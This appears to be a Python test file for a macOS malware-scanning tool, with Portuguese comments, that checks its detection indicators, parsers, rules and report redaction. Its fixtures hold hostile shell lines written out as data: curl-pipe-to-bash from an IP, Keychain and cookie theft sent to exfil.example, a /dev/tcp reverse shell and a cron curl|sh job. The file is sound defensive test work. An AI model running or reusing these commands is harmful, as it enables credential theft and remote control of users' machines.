import importlib.util, json, os, tempfile, stat
spec = importlib.util.spec_from_file_location("md", "mac-doctor.py"); md = importlib.util.module_from_spec(spec); spec.loader.exec_module(md)
d = tempfile.mkdtemp(dir="/root/md-test")
def w(nome, txt, mode=0o755):
    p = os.path.join(d, nome); open(p, "w").write(txt); os.chmod(p, mode); return p

mal = w("upd.sh", """#!/bin/bash
# updater
curl -fsSL http://45.9.148.3/p.sh | bash
security find-generic-password -wa Chrome > /tmp/.k
echo aGVsbG8gd29ybGQ= | base64 -d | sh
xattr -d com.apple.quarantine /Users/Shared/.h/agent
nohup /Users/Shared/.h/agent &
export API_TOKEN=sk-ant-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH
curl -s -d @/Users/alexandre/Library/Cookies/Cookies.binarycookies https://user:pw@exfil.example/up?id=alexandre
""")
ok = w("keystone.sh", """#!/bin/sh
# Atualizador
"/Library/Application Support/Vendor/Updater.app/Contents/MacOS/Updater" --check
exit 0
""")
binario = w("bin", "\xcf\xfa\xed\xfe binary")

i = md.info_script(mal); nomes = {x["nome"]: x for x in i["indicadores"]}
print("indicadores (malicioso):"); [print("  ", x["peso"], "|", x["nome"], "| L%d" % x["linha"]) for x in i["indicadores"]]
for esperado in ["baixa código da internet e executa na hora","lê senhas do Keychain","decodifica conteúdo embaralhado e executa",
                 "remove a marca de quarentena de arquivo baixado","acessa senhas, cookies ou carteiras de navegador",
                 "envia dados para fora","conecta direto a um endereço IP","roda escondido ou apaga rastros","usa pasta temporária ou compartilhada"]:
    assert esperado in nomes, "faltou: " + esperado
assert len(i["sha256"]) == 64 and i["permissoes"] == "755" and i["indicadores"][0]["peso"] == "alto"
assert md.info_script(ok)["indicadores"] == [], md.info_script(ok)["indicadores"]
assert md.info_script("/nao/existe").get("erro")
# localização do script
assert md.achar_script("/bin/bash", ["/bin/bash", mal]) == (mal, "")
assert md.achar_script("/bin/sh", ["/bin/sh", "-c", "curl http://x | sh"]) == ("", "curl http://x | sh")
assert md.achar_script(ok, [ok]) == (ok, "")
assert md.achar_script(binario, [binario]) == ("", "")
assert md.achar_script("/usr/bin/python3", ["/usr/bin/python3", mal, "--x"])[0] == mal
# comentário não dispara; linhas benignas comuns não geram [alto]
assert md.analisar_texto("#!/bin/sh\n# curl http://x | sh\necho ok\n") == []
ben = md.analisar_texto('#!/bin/zsh\neval "$(/opt/homebrew/bin/brew shellenv)"\nexport PATH="$HOME/.cargo/bin:$PATH"\nsource ~/.nvm/nvm.sh\n')
assert all(x["peso"] != "alto" for x in ben), ben

# BTM parser com saída típica do sfltool
orig = md.run
md.run = lambda cmd, timeout=40: """========================
 Records for UID 501 : AAAA-BBBB
========================

 Items:

 #1:
                 UUID: 1111
                 Name: Google Updater
       Developer Name: Google LLC
      Team Identifier: EQHXZ8M8AV
                 Type: developer (0x20)
          Disposition: [enabled, allowed, visible, notified] (0xb)
           Identifier: Google LLC
                  URL: (null)
    Embedded Item Identifiers:
      #1: 16.com.google.keystone.agent

 #2:
                 UUID: 2222
                 Name: bash
                 Type: legacy agent (0x8)
          Disposition: [disabled, allowed, visible, notified] (0xa)
           Identifier: 8.com.x.upd
                  URL: file:///Users/alexandre/Library/LaunchAgents/com.x%20y.upd.plist
      Executable Path: /bin/bash

========================
 Records for UID 502 : CCCC
========================
 #1:
                 Name: outro
          Disposition: [enabled, allowed]
"""
b = md._btm(501); md.run = orig
assert [x["nome"] for x in b] == ["Google Updater", "bash"], b
assert b[0]["ativo"] and b[0]["dev"] == "Google LLC" and b[0]["arquivo"] == "" and b[0]["tipo"] == "developer"
assert not b[1]["ativo"] and b[1]["arquivo"] == "/Users/alexandre/Library/LaunchAgents/com.x y.upd.plist" and b[1]["exe"] == "/bin/bash"
md.run = lambda cmd, timeout=40: '\tdisabled services = {\n\t\t"com.x.upd" => disabled\n\t\t"com.y" => enabled\n\t\t"com.old" => true\n\t}\n'
assert md._desativados("system") == {"com.x.upd": True, "com.y": False, "com.old": True}; md.run = orig

# regras + filtro + html ponta a ponta com scripts
ident = {"user":"alexandre","uid":501,"gid":20,"home":"/Users/alexandre","nome":"Alexandre Camerini","hosts":["MacBook-Pro-de-Alexandre"]}
base = json.load(open("t/raw_base.json")) if os.path.exists("t/raw_base.json") else None
raw = {"root":True,"nao_verificado":[],"postura":{"macos":"15.6","sip":"enabled","gatekeeper":"assessments enabled","filevault":"FileVault is On.","firewall":"enabled"},
 "launch":[
  {"plist":"/Users/alexandre/Library/LaunchAgents/com.x.upd.plist","label":"com.x.upd","prog":"/bin/bash","args":["/bin/bash",mal],"sig":("apple","Apple (sistema)"),"estado":"desativado nos Ajustes (Itens de Início)","gatilho":"ao ligar/logar, a cada 300 s","embutido":"","script":i,"mtime":"2026-11-01"},
  {"plist":"/Library/LaunchAgents/com.vendor.keystone.plist","label":"com.vendor.keystone","prog":ok,"args":[ok],"sig":("sem","SEM ASSINATURA"),"estado":"ativo (carregado agora)","gatilho":"ao ligar/logar","embutido":"","script":md.info_script(ok),"mtime":"2025-01-01"},
  {"plist":"/Library/LaunchDaemons/com.apple.fake.plist","label":"com.apple.fake","prog":"/bin/sh","args":["/bin/sh","-c","bash -i >& /dev/tcp/10.1.2.3/4444 0>&1"],"sig":("apple","Apple (sistema)"),"estado":"desativado","gatilho":"mantido sempre vivo","embutido":"bash -i >& /dev/tcp/10.1.2.3/4444 0>&1","script":None,"mtime":"2026-11-02"},
 ],
 "btm": b, "login_hooks":[], "tcc":{}, "mdm":False, "perfis":[], "escuta":[], "conexoes":{}, "proxy":[], "proxy_ativo":False, "certs":[],
 "procs":[], "procs_terceiros":[], "apps":[], "extensoes":[],
 "cron":[{"usuario":"alexandre","linha":"*/5 * * * * curl -s http://1.2.3.4/x | sh","indicadores":md.analisar_texto("*/5 * * * * curl -s http://1.2.3.4/x | sh")}],
 "perfis_shell":[{"arquivo":"/Users/alexandre/.zshrc","indicadores":[x for x in md.analisar_texto("security dump-keychain -d > /tmp/x") if x["peso"]=="alto"]}],
 "legado":["/etc/rc.local"], "ssh_chaves":["ssh-ed25519 alguem@host"], "sudoers":[{"arquivo":"/private/etc/sudoers.d/zz","sem_senha":True},{"arquivo":"/private/etc/sudoers.d/ok","sem_senha":False}],
 "perf":{"ncpu":8,"ram_gb":16,"chip":"Apple M2","load1":1.0,"uptime_dias":1,"top_cpu":[],"top_mem":[],"mem_livre_pct":60,"swap_mb":0,"disco_uso_pct":40,"cpu_limite_pct":100,"pouca_energia":False,"bateria_condicao":"Normal","timemachine":False,"panics_30d":0,"travamentos_7d":0,"smart":"Verified"}}
ach = md.aplicar_regras(raw)
sb = {a["ev"]["rotulo"]: a for a in ach if a["regra"] == "script_bg"}
assert sb["com.x.upd"]["sev"] == "critico" and "(desativado)" in sb["com.x.upd"]["titulo"]
assert sb["com.vendor.keystone"]["sev"] == "info" and sb["com.vendor.keystone"]["ev"]["indicadores"] == ["nenhum indicador de risco encontrado"]
fk = sb["com.apple.fake"]; assert fk["sev"] == "critico" and any("imita a Apple" in x for x in fk["ev"]["indicadores"]) and any("shell reverso" in x for x in fk["ev"]["indicadores"])
assert {a["regra"] for a in ach} >= {"script_bg","cron","perfil_shell","legado","ssh_chaves","sudoers"}
assert sum(a["regra"]=="sudoers" for a in ach) == 1 and all(a["regra"] in md.PLAYBOOK for a in ach)
print(len(ach), "achados:", [(a["id"], a["sev"], a["regra"]) for a in ach])

f = md.Filtro(ident)
for completo in (False, True):
    pl = md.montar_payload(raw, ach, f, completo); t = json.dumps(pl, ensure_ascii=False)
    for proibido in ["alexandre","sk-ant-abcdef","user:pw@","id=alexandre","10.1.2.3","alguem@host","Camerini"]:
        assert proibido.lower() not in t.lower(), ("VAZOU", completo, proibido)
    assert i["sha256"] in t and "45.9.148.3" in t and f.vazou(t) == []
    assert ("conteudo_script" in t) == completo
    print("payload %s: %d bytes" % ("com scripts" if completo else "padrão", len(t.encode())))
assert "SEGREDO" in t and "<CREDENCIAL>@exfil.example" in t and "?PARAMETROS" in t

meta = {"quando":"12/11/2026","motivo_sem_ia":"offline","envio":"x"}
h = md.gerar_html(raw, ach, None, meta); open("t/rel-scripts.html","w").write(h)
assert "Ver o conteúdo do script" in h and "curl -fsSL http://45.9.148.3/p.sh | bash" in h and "Permitir em segundo plano" in h
assert "<script" not in h.lower() and "{arquivo}" not in h and "virustotal.com" in h and "desativado nos Ajustes" in h
print("TESTES DE SCRIPTS PASSARAM")
assert not any(a["regra"] == "persist_sem_assinatura" for a in ach), "script benigno gerou falso crítico de assinatura"
